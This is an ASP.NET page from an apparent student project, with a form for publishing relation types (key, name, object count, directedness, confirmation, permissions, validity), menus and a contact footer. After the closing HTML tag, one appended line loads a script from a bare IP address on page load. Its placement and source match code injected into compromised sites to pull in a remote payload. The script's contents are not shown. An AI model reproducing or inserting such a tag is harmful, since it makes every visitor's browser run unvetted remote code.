<%@ Page Language="vb" AutoEventWireup="false" Codebehind="rdefinitionpublish.aspx.vb" Inherits="relation.WebForm3"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>WebForm3</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="Visual Basic .NET 7.1" name="CODE_LANGUAGE">
		<meta content="VBScript" name="vs_defaultClientScript">
		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
	</HEAD>
	<body ms_positioning="GridLayout">
		<P>
			<TABLE id="Table1" style="Z-INDEX: 101; LEFT: 8px; WIDTH: 788px; POSITION: absolute; TOP: 0px; HEIGHT: 912px"
				cellSpacing="0" cellPadding="0" width="788" border="0">
				<TR>
					<TD>
						<TABLE id="Table9" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
							border="0" valign="middle">
							<TR>
								<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
									<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
								</TD>
							</TR>
							<TR bgColor="#ffffff">
								<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
							</TR>
							<TR>
								<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
							</TR>
						</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
						<TABLE id="Table10" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
							<TR>
								<TD class="p9" vAlign="middle" width="196" bgColor="#dedede" height="18">
									<DIV align="center"><SPAN class="p10"><FONT color="#ffffff"></FONT></SPAN><FONT color="#666666"><B>2005年 
												10月28日 星期五 </B></FONT>
									</DIV>
								</TD>
								<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
									<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
								</TD>
								<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
									height="18">
									<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
													href="rmodelpublish.aspx" target="_top">发布</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
													href="rmodelsearch.aspx" target="_top">查询</A>&nbsp;<A href="rmodelmodification.aspx">修改</A>
											</FONT></SPAN>
									</DIV>
								</TD>
							</TR>
						</TABLE>
						<DIV id="Div1" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
						<FONT face="宋体"></FONT>
						<TABLE id="Table11" height="62" cellSpacing="0" width="778" align="center">
							<TR border="0">
								<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
									<FONT color="#000000">&nbsp;|</FONT><FONT color="#000000"><SPAN class="p9"> <A href="index.aspx">
												首页</A></SPAN> </FONT><FONT color="#000000">|</FONT> <FONT color="#000000">
										<SPAN class="p9"><A href="index.aspx">用户登录</A></SPAN> |<A href="newcustomer.aspx">注册</A>
									</FONT>
								</TD>
							</TR>
							<TR border="0">
								<TD vAlign="top" width="172" bgColor="#0859ad" height="20">&nbsp;
									<asp:label id="lblHint" runat="server" ForeColor="Info">Label</asp:label></TD>
								<TD vAlign="top" bgColor="#0859ad" height="20">
									<DIV align="right"><FONT color="#ffffff">
											<MARQUEE scrollDelay="100" direction="left" behavior="scroll" loop="-1">欢迎您 
												&nbsp;软件业的朋友！ &nbsp; &nbsp;</MARQUEE>
										</FONT>
									</DIV>
								</TD>
							</TR>
						</TABLE>
						<CENTER>
							<TABLE id="Table12" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
								border="0">
								<TR>
									<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
										<TABLE id="Table13" cellSpacing="0" cellPadding="0" width="100%" border="0">
											<TR>
												<TD vAlign="top" bgColor="#0859ad">
													<DIV align="center"><FONT face="宋体"></FONT>&nbsp;</DIV>
												</TD>
											</TR>
										</TABLE>
										<TABLE id="Table14" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
											<TR>
												<TD vAlign="top" bgColor="#9cd7ef">
													<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 32px" height="32" src="imga/grad.gif" width="172">&nbsp;
														<TABLE id="Table15" style="WIDTH: 153px; HEIGHT: 153px" width="153" border="1">
															<TR>
																<TD width="147" height="45">
																	<DIV align="center">&nbsp;&nbsp;<A href="rmodelpublish.aspx">发布关系空间</A></DIV>
																</TD>
															</TR>
															<TR>
																<TD height="43">
																	<DIV align="center"><A href="rdefinitionpublish.aspx">发布关系类型</A></DIV>
																</TD>
															</TR>
															<TR>
																<TD height="55">
																	<DIV align="center"><A href="rinstancepublish.aspx">发布关系实例</A></DIV>
																</TD>
															</TR>
														</TABLE>
														<BR>
														<BR>
													</DIV>
												</TD>
											</TR>
										</TABLE>
									</TD>
									<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
									<TD vAlign="top" width="611">
										<FORM id="Form1" style="MARGIN: 0px" name="loginForm" action="" method="post" runat="server">
											&nbsp;&nbsp;&nbsp;<FONT face="宋体"> </FONT>
											<TABLE id="Table5" style="WIDTH: 582px; HEIGHT: 497px" cellSpacing="1" cellPadding="1"
												width="582" border="1">
												<TR>
													<TD style="WIDTH: 283px; HEIGHT: 32px">
														<TABLE id="Table2" style="WIDTH: 264px; HEIGHT: 30px" cellSpacing="1" cellPadding="1" width="264"
															border="1">
															<TR>
																<TD style="WIDTH: 122px">
																	<asp:label id="lblModelKey" runat="server" Width="120px">关系空间编号</asp:label><FONT face="宋体"></FONT></TD>
																<TD>
																	<asp:dropdownlist id="ddlstModelKey" runat="server" Width="126px"></asp:dropdownlist><FONT face="宋体"></FONT></TD>
															</TR>
														</TABLE>
													</TD>
													<TD style="WIDTH: 241px; HEIGHT: 32px"><FONT face="宋体"></FONT></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px; HEIGHT: 6px">
														<asp:label id="lblDefKey" runat="server">关系类型编号</asp:label><FONT face="宋体"></FONT></TD>
													<TD style="WIDTH: 241px; HEIGHT: 6px"><FONT face="宋体"></FONT></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px; HEIGHT: 29px">
														<asp:textbox id="txtDefKey" runat="server"></asp:textbox></TD>
													<TD style="WIDTH: 241px; HEIGHT: 29px">&nbsp;&nbsp;
														<asp:regularexpressionvalidator id="txtDefKeyRegularExpressionValidator" runat="server" Width="240px" ErrorMessage="！输入关系类型编号必须为数字"
															ValidationExpression="[0-9]{1,}" ControlToValidate="txtDefKey" Height="14px"></asp:regularexpressionvalidator></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px; HEIGHT: 7px">
														<asp:label id="lblDefName" runat="server">关系类型名称</asp:label></TD>
													<TD style="WIDTH: 241px; HEIGHT: 7px"><FONT face="宋体"></FONT></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px; HEIGHT: 29px">
														<asp:textbox id="txtDefName" runat="server"></asp:textbox></TD>
													<TD style="WIDTH: 241px; HEIGHT: 29px"></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px; HEIGHT: 30px">
														<asp:label id="lblRelObjNum" runat="server">关系对象个数</asp:label></TD>
													<TD style="WIDTH: 241px; HEIGHT: 30px"><FONT face="宋体"></FONT></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px; HEIGHT: 29px">
														<asp:textbox id="txtRelObjNum" runat="server"></asp:textbox></TD>
													<TD style="WIDTH: 241px; HEIGHT: 29px">&nbsp;
														<asp:regularexpressionvalidator id="txtRelObjNumRegularexpressionvalidator1" runat="server" Width="240px" ErrorMessage="！输入关系对象个数必须为整数"
															ValidationExpression="[0-9]{1,}" ControlToValidate="txtRelObjNum" Height="14px" DESIGNTIMEDRAGDROP="244"></asp:regularexpressionvalidator></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px; HEIGHT: 29px">
														<asp:label id="Label1" runat="server" Width="192px">是否为有向关系</asp:label></TD>
													<TD style="WIDTH: 241px; HEIGHT: 29px"></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px; HEIGHT: 32px">
														<asp:radiobutton id="rbtnIsDirYes" runat="server" Text="是" GroupName="rbtnIsDir"></asp:radiobutton>&nbsp;
														<asp:radiobutton id="rbtnIsDirNo" runat="server" Text="不是" GroupName="rbtnIsDir"></asp:radiobutton></TD>
													<TD style="WIDTH: 241px; HEIGHT: 32px"><FONT face="宋体"></FONT></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px; HEIGHT: 29px">
														<asp:label id="lblNeedAff" runat="server" Width="192px">是否需要关联对象的确认</asp:label></TD>
													<TD style="WIDTH: 241px; HEIGHT: 29px"></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px; HEIGHT: 32px">
														<asp:radiobutton id="rbtnNeedAffYes" runat="server" Text="需要确认" GroupName="rbtnNeedAff"></asp:radiobutton>&nbsp;
														<asp:radiobutton id="rbtnNeedAffNo" runat="server" Text="不需要确认" GroupName="rbtnNeedAff"></asp:radiobutton></TD>
													<TD style="WIDTH: 241px; HEIGHT: 32px"><FONT face="宋体"></FONT></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px; HEIGHT: 32px">
														<asp:label id="lblIsValid" runat="server" Width="104px">用户权限</asp:label></TD>
													<TD style="WIDTH: 241px; HEIGHT: 32px"></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px">
														<asp:radiobutton id="rbtnAccPri1" runat="server" Text="权限1" GroupName="rbtnAccPri"></asp:radiobutton>&nbsp;
														<asp:radiobutton id="rbtnAccPri2" runat="server" Text="权限2" GroupName="rbtnAccPri"></asp:radiobutton>&nbsp;
														<asp:radiobutton id="rbtnAccPri3" runat="server" Text="权限3" GroupName="rbtnAccPri"></asp:radiobutton></TD>
													<TD style="WIDTH: 241px"></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px">
														<asp:label id="Label4" runat="server">关系空间有效性</asp:label></TD>
													<TD style="WIDTH: 241px"></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px">
														<asp:radiobutton id="rbtnIsValidYes" runat="server" Text="有效" GroupName="rbtnIsValid"></asp:radiobutton>&nbsp;&nbsp;
														<asp:radiobutton id="rbtnIsValidNo" runat="server" Text="无效" GroupName="rbtnIsValid"></asp:radiobutton></TD>
													<TD style="WIDTH: 241px"></TD>
												</TR>
												<TR>
													<TD style="WIDTH: 283px; HEIGHT: 37px">
														<TABLE id="Table3" style="WIDTH: 267px; HEIGHT: 32px" cellSpacing="1" cellPadding="1" width="267"
															border="1">
															<TR>
																<TD style="WIDTH: 143px">&nbsp;</TD>
																<TD style="WIDTH: 59px">
																	<asp:button id="btnNext" runat="server" Text="下一步"></asp:button></TD>
																<TD></TD>
															</TR>
														</TABLE>
													</TD>
													<TD style="WIDTH: 241px; HEIGHT: 37px">
														<TABLE id="Table4" style="WIDTH: 300px; HEIGHT: 18px" cellSpacing="1" cellPadding="1" width="300"
															border="1">
															<TR>
																<TD style="WIDTH: 50px">&nbsp;</TD>
																<TD style="WIDTH: 73px">
																	<asp:button id="btnCancel" runat="server" Text="撤消"></asp:button></TD>
																<TD></TD>
															</TR>
														</TABLE>
													</TD>
												</TR>
												<TR>
													<TD style="WIDTH: 300px" colSpan="2"><FONT face="宋体">
															<asp:label id="lblWarning" runat="server" ForeColor="#0000C0" Width="408px">label</asp:label></FONT></TD>
												</TR>
											</TABLE>
											<P><FONT face="宋体"></FONT>&nbsp;</P>
										</FORM>
									</TD>
								</TR>
							</TABLE>
						</CENTER> <!---====================include pagetail================-->
						<CENTER>
							<TABLE id="Table16" cellSpacing="0" cellPadding="0" width="778" border="0">
								<TR>
									<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
								</TR>
								<TR>
									<TD class="p9" background="imga/bg5.gif">
										<DIV align="center">| 联络我们 | 客服电话：<STRONG><FONT face="Arial">0571-63740939</FONT></STRONG></DIV>
									</TD>
								</TR>
								<TR>
									<TD class="p9" bgColor="#ffffff"><FONT face="宋体">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
											版权所有：&nbsp;&nbsp; 浙江林学院信息工程学院天信022 王海玲 陆美丽 </FONT>
									</TD>
								</TR>
							</TABLE>
						</CENTER>
					</TD>
				</TR>
			</TABLE>
		</P>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
